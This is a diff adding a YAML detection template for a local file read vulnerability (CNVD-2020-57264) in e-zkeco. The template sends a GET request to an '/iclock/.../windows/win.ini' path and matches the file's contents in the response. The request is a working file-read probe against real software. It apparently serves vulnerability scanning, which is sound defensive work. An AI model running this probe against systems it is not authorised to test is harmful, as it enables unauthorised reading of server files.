@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '[fonts]'
+          - '[extensions]'
+        case-insensitive: true
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/iclock/ccccc/windows/win.ini'
+id: CNVD-2020-57264
+info:
+  author: ThestaRY
+  description: |
+    e-zkeco存在本地文件读取漏洞，攻击者可以通过构造恶意请求获取服务器上的任意文件。
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: e-zkeco-iclock-fileread
+  severity: high
+  tags: cnvd,cnvd2020,fileread,argus-import
